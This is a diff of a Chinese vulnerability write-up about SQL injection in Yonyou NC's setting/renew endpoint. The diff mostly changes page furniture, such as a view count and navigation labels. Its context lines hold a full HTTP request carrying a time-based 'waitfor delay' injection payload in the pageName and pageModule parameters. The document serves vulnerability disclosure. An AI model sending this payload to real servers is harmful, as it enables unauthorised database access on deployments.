@@ -7,9 +7,17 @@ asset_dir: assets/用友nc-settingrenew-sql注入漏洞
 # 用友NC setting/renew sql注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/2/10 08:28
-- 816浏览
+- 818浏览
 - [0评论](#comment)
 - 1小时阅读
+
+深入探索
+
+漏洞预警服务
+
+技术文章订阅
+
+网络安全会议
 
 ---
 
@@ -230,6 +238,8 @@ Host: nc65.mrxn.net
 ```
 
 因存在 `LfwRuntimeEnvironment.getLfwSessionBean()` 漏洞利用需要登录权限
+
+漏洞修复方案
 
 ```
 GET /portal/pt/setting/renew?pageId=login&pageName=1'waitfor+delay+'0:0:2'--&pageModule=1'waitfor+delay+'0:0:2'-- HTTP/1.0
